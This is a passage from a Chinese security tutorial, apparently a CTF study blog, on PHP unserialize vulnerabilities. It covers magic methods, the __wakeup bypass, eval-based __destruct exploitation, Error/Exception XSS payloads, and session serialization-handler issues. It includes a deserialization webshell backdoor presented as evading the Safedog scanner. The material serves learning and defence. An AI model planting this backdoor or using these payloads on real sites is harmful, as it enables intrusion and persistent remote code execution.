    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token operator">=</span><span class="token string">'flag{adedyui}'</span><span class="token punctuation">;</span>
    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token string">'Sch0lar'</span><span class="token punctuation">;</span>
    <span class="token variable">$ctfer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token operator">=</span><span class="token string">'18'</span>

    <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>反序列化之前重新给flag属性赋值</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 输出结果</span>
<span class="token function">object</span><span class="token punctuation">(</span>Ctf<span class="token punctuation">)</span><span class="token shell-comment comment">#2 (3) {</span>
    <span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token string">"no flag"</span>
    <span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token string">"Sch0lar"</span>
    <span class="token punctuation">[</span><span class="token string">"age"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"18"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="PHP反序列化漏洞（常规）"><a href="#PHP反序列化漏洞（常规）" class="headerlink" title="PHP反序列化漏洞（常规）"></a>PHP反序列化漏洞（常规）</h1><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。</p>
<p>在反序列化的过程中自动触发了某些魔术方法。</p>
<p><strong>漏洞触发条件：</strong> unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法</p>
<p><strong>魔术方法：</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当对象创建（<span class="token keyword">new</span>）时会自动调用。但在 <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 时是不会自动调用的。

<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当一个对象销毁（反序列化）时被调用

<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当一个对象被当作一个字符串使用时被调用

<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 在对象在被序列化之前立即运行

<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 将在序列化之后立即被调用
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。</p>
<h2 id="WAKEUP"><a href="#WAKEUP" class="headerlink" title="__WAKEUP()"></a>__WAKEUP()</h2><p>将在序列化之后立即被调用<br><strong>当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行</strong>。这个大家应该都知道很常见的姿势了。为了直观一点找了些考察反序列化的ctf。</p>
<p><strong>实例：CTF</strong><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215514.JPEG" alt="img"><br>首先我们本地进行序列化后得到字符串:</p>
<pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"xctf"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"111"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215515.JPEG" alt="img"><br>把1写成2 达到绕过wakeup()效果 拿到flag，这是因为<strong>当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行</strong>，<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215516.png" alt="img"><br><strong>图中序列化后字符串中表示对象属性个数为2，而真实的类中实际只有1个属性，这是就会跳过__wakeup的执行。</strong></p>
<h2 id="DESTRUCT"><a href="#DESTRUCT" class="headerlink" title="__DESTRUCT()"></a>__DESTRUCT()</h2><p>当一个对象被销毁时被调用</p>
<h3 id="示例一："><a href="#示例一：" class="headerlink" title="示例一："></a>示例一：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>　
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>要让<code>eval($this-&gt;var);</code>执行我们的恶意代码，我们就需要修改属性<code>$var</code>的值。接下来构造序列化数据：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token operator">=</span><span class="token string">'phpinfo()'</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>得</p>
<pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"Example"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"var"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"phpinfo()"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>反序列化后在脚本运行结束时就会调用__destruct函数，同时会覆盖$var变量输出执行eval(phpinfo())：</strong><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215517.JPEG" alt="在这里插入图片描述"></p>
<h3 id="示例二（连菜刀、反序列化免杀后门）："><a href="#示例二（连菜刀、反序列化免杀后门）：" class="headerlink" title="示例二（连菜刀、反序列化免杀后门）："></a>示例二（连菜刀、反序列化免杀后门）：</h3><p>与上题原理相似</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string">"demo"</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token variable">$pp</span> <span class="token operator">=</span> <span class="token string">"O:1:\"A\":1:{s:4:\"test\";s:"</span><span class="token punctuation">.</span><span class="token variable">$len</span><span class="token punctuation">.</span><span class="token string">":\""</span><span class="token punctuation">.</span><span class="token variable">$test</span><span class="token punctuation">.</span><span class="token string">";\";}"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 构造序列化对象，用我们POST传过去的命令代码字符串覆盖$test="demo"，从而执行恶意命令。</span>
<span class="token variable">$test_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$pp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 反序列化同时触发_destruct函数</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215518.png" alt="在这里插入图片描述"><br>以上代码就相当于<code>&lt;?php @eval($_POST['test']);?&gt;</code><br>直接菜刀链接：<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215519.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215520.png" alt="在这里插入图片描述"><br>安全狗：<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215521.png" alt="在这里插入图片描述"><br>此木马毕竟是跟正常文件太像，所以免杀效果很不错。</p>
<h2 id="TOSTRING"><a href="#TOSTRING" class="headerlink" title="__TOSTRING()"></a>__TOSTRING()</h2><p>本节围绕着一个问题，<strong>如果在代码审计中有反序列化点，但是在原本的代码中找不到pop链该如何？</strong> N1CTF有一个无pop链的反序列化的题目，<strong>其中就是找到php内置类来进行反序列化</strong>。</p>
<p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。此方法必须返回一个字符串。</p>
<p><strong>__toString当对象被当作一个字符串使用时候调用(不仅仅是<code>echo</code>的时候，比如file_exists()判断也会触发)</strong></p>
<h4 id="ERROR类"><a href="#ERROR类" class="headerlink" title="ERROR类"></a>ERROR类</h4><p>适用于php7版本</p>
<blockquote>
<p>Error类就是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个toString的方法。<strong>如果有个pop链走到一半就走不通了，不如尝试利用这个来做一个xss</strong>，其实我看到的还是有好一些cms会选择直接使用<code>echo 一个反序列化以后得到的类</code>的写法，前文说了当对象被当作一个字符串使用时候调用(如<code>echo</code>的时候)会触发__toString方法，这是一种挖洞的新思路（对我而言）。</p>
</blockquote>
<p><strong>XSS</strong><br>开启报错的情况下：<br>测试代码：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'yds'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 这里echo了一个反序列化以后得到的类</span>
<span class="token delimiter">?></span> 
仅看到是一个反序列化，但是不知道类啊，这就遇到了一个反序列化但没有pop链的情况，所以只能找到php内置类来进行反序列化
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>exp：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token delimiter">?></span>

<span class="token comment" spellcheck="true">//得：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D    这就是生成的 urlencode($b)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>则在URL中令<br><code>/?yds=O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</code></p>
<p>成功插入xss<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215522.png" alt="在这里插入图片描述"><br>并成功alert<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215523.png" alt="在这里插入图片描述"></p>
<h4 id="EXCEPTION"><a href="#EXCEPTION" class="headerlink" title="EXCEPTION"></a>EXCEPTION</h4><p>适用于php5、7版本</p>
<p>这个类利用的方式和原理和Error 类一模一样，但是适用于php5和php7，相对之下更加好用。</p>
<p><strong>XSS</strong><br>开启报错的情况下:<br>测试代码：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'yds'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 这里echo了一个反序列化以后得到的类</span>
<span class="token delimiter">?></span> 
仅看到是一个反序列化，但是不知道类啊，这就遇到了一个反序列化但没有pop链的情况，所以只能找到php内置类来进行反序列化          
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>exp：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token comment" spellcheck="true">//得：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span>
<span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>则我们在url中令：<br><code>/?yds=O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215524.png" alt="在这里插入图片描述"><br>并成功alert<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215523.png" alt="在这里插入图片描述"></p>
<h1 id="PHP中SESSION反序列化（重点）"><a href="#PHP中SESSION反序列化（重点）" class="headerlink" title="PHP中SESSION反序列化（重点）"></a>PHP中SESSION反序列化（重点）</h1><h2 id="简介与基础知识"><a href="#简介与基础知识" class="headerlink" title="简介与基础知识"></a>简介与基础知识</h2><p>在php.ini中存在三项配置项：</p>
<ul>
<li><code>session.save_path=""</code> –设置session的存储路径</li>
<li><code>session.save_handler=""</code> –<strong>设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</strong></li>
<li><code>session.auto_start boolen</code> –指定会话模块是否在请求开始时启动一个会话，默认为0不启动</li>
<li><code>session.serialize_handler string</code> –<strong>定义用来序列化/反序列化的处理器名字。默认使用php (php&lt;5.5.4)</strong></li>
</ul>
<p>以上的选项就是与PHP中的Session 存储 和 序列化存储 有关的选项。</p>
<p>在使用<strong>xampp</strong>组件安装中，上述的配置项的设置如下：</p>
<ul>
<li><code>session.save_path="D:\xampp\tmp"</code> 表明所有的session文件都是存储在xampp/tmp下</li>
<li><code>session.save_handler=files</code> 表明session是以文件的方式来进行存储的</li>
<li><code>session.auto_start=0</code> 表明默认不启动session</li>
<li><code>session.serialize_handler=php</code> <strong>表明session的默认序列化引擎使用的是php序列话引擎</strong></li>
</ul>
<p><strong>在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</strong></p>
<table>
<thead>
<tr>
<th align="left">引擎</th>
<th align="left">session存储方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">php(php&lt;5.5.4)</td>
<td align="left">存储方式是，键名+竖线`</td>
</tr>
<tr>
<td align="left">php_serialize(php&gt;5.5.4)</td>
<td align="left">存储方式是，经过serialize()函数序列化处理的键和值（将session中的key和value都会进行序列化）</td>
</tr>
<tr>
<td align="left">php_binary</td>
<td align="left">存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</td>
</tr>
</tbody></table>
<p>在PHP (php&lt;5.5.4) 中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set('session.serialize_handler', '需要设置的引擎名');</code>进行设置。</p>
<p>示例代码如下：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//设置序列化引擎使用php_serialize</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// do something</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>存储机制</strong></p>
<p><strong>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid(PHPSESSID)来进行命名的，文件的内容就是session值经过serialize()函数序列化之后的内容。</strong><br>假设我们的环境是xampp，那么默认配置如上所述。</p>
<p><strong>在默认配置情况下（在php引擎下：）：</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// session_start()会创建新会话或者重用现有会话</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'spoock'</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后的session的存储和显示如下：<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210410215525.png" alt="在这里插入图片描述"><br>可以看到PHPSESSID的值是jo86ud4jfvu81mbg28sl2s56c2，所以在xampp/tmp下存储的文件名是sess_jo86ud4jfvu81mbg28sl2s56c2，文件的内容是<code>name|s:6:"spoock";</code> 。name是键值，<code>s:6:"spoock";</code>是<code>serialize("spoock")</code>的结果（php引擎方式存储：键名+竖线 |+经过serialize()函数序列处理的值）。</p>
<p><strong>在php_serialize引擎下：</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 设置序列化引擎使用php_serialize</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 启动新会话或者重用现有会话 </span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'spoock'</span><span class="token punctuation">;</span>  
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>SESSION文件的内容是<code>a:1:{s:4:"name";s:6:"spoock";}</code> 。a:1是使用php_serialize进行序列话都会加上。同时<strong>使用php_serialize会将session中的key(键)和value(值)都会进行序列化</strong>。</p>
<p><strong>在php_binary引擎下：</strong><br>存储方式是，键名的长度<strong>对应的ASCII字符</strong>+键名+经过serialize()函数序列化处理的值</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php_binary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'spoock'</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>SESSION文件的内容是<code>names:6:"spoock";</code> 。由于name的长度是4，4在ASCII表中对应的就是EOT（这个）。根据php_binary的存储规则，最后就是<code>names:6:"spoock";</code> 。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p>
<h2 id="SESSION序列化漏洞利用"><a href="#SESSION序列化漏洞利用" class="headerlink" title="SESSION序列化漏洞利用"></a>SESSION序列化漏洞利用</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">syclover</span><span class="token punctuation">{</span>
 <span class="token keyword">var</span> <span class="token variable">$func</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// __construct()在实例化是被调用</span>
  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span> <span class="token operator">=</span> <span class="token string">"phpinfo()"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在11行对传入的参数进行了反序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行eval()方法。我们访问<code>localhost/test.php?a=O:8:"syclover":1:{s:4:"func";s:14:"echo "spoock";";}</code> 。<br>那么反序列化得到的内容是：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token function">object</span><span class="token punctuation">(</span>syclover<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
 <span class="token keyword">public</span> <span class="token string">'func'</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'echo "spoock";'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">14</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>最后页面输出的就是spoock，说明最后执行了我们定义的echo “spoock”;方法。</strong>这就是一个简单的序列化的漏洞的演示</p>
<h4 id="PHP-SESSION中的序列化危害"><a href="#PHP-SESSION中的序列化危害" class="headerlink" title="PHP SESSION中的序列化危害"></a>PHP SESSION中的序列化危害</h4><p>PHP中的Session的实现是没有的问题的，危害主要是由于程序员的Session使用不当而引起的。<br><strong>如果设置的session序列化选择器与默认的不同的话就可能会产生漏洞（会导致数据无法正确的反序列化）。</strong>通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
